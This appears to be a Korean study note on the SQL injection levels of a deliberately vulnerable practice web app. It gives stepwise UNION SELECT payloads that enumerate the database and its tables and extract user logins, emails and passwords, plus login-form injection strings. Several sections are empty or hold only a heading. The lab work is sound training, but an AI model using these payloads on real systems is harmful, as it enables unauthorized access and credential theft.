# SQL\_Injection

## SQL\_Injection (GET/Search)

* "spider"를 입력하면 나오는 결과 &#x20;
* 잘못된 구문에도 일일이 반응한다. &#x20;

### union select

* 칼럼 순서를 확인할 수 있다.&#x20;

{% stepper %}
{% step %}
### 칼럼 순서 확인

예시 페이로드:

```sql
'union select 1,database(),@@datadir,system_user(),@@version,6,7#
```
{% endstep %}

{% step %}
### 테이블 이름 조회

예시 페이로드:

```sql
'union select 1,table_name,3,4,5,6,7 from information_schema.tables#
```
{% endstep %}

{% step %}
### 컬럼 이름 조회

예시 페이로드:

```sql
'union select 1,column_name,3,4,5,6,7 from information_schema.columns#
```
{% endstep %}

{% step %}
### 특정 테이블의 컬럼 필터링

예시 페이로드:

```sql
0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#
```
{% endstep %}

{% step %}
### 데이터 추출

예시 페이로드:

```sql
0'union select 1,id,login,email,password,6,7 from users#
```
{% endstep %}
{% endstepper %}

* medium&#x20;

\= 구문 뒤에 \를 통해 SQL 구문을 일반 문자열로 인식되도록 한다.

## SQL Injection (GET/Select)

## SQL Injection (AJAX/JSON/jQuery)

AJAX: Asynchronous JavaScript and XML(비동기 자바스크립트 xml)

* 아무 반응이 없다.&#x20;

## SQL Injection (Login Form/Hero)

페이로드 예시:

```sql
' union select 1,2,3,4#
```

또 다른 예시:

```sql
' union select 1,@@version,3,system_user()#
```

## SQL Injection (Login Form/User)

(이미지나 추가 내용 없음)

## SQL Injection (SQLite)

* 딱히 보여주는 정보는 없다.

## Drupal SQL Injection (Drupageddon)

### 메타익스플로잇

[meterpreter](/broken/pages/2358b08190997828ed3b6dc8c71b7970bb3dca2b)

### Self

(내용 없음)

## SQL Injection - Stored (User-Agent)

* 다운로드 시 proxy tool로 주고 받는 파라미터에 SQL 인젝션 시도

## SQL Injection - Stored (XML)
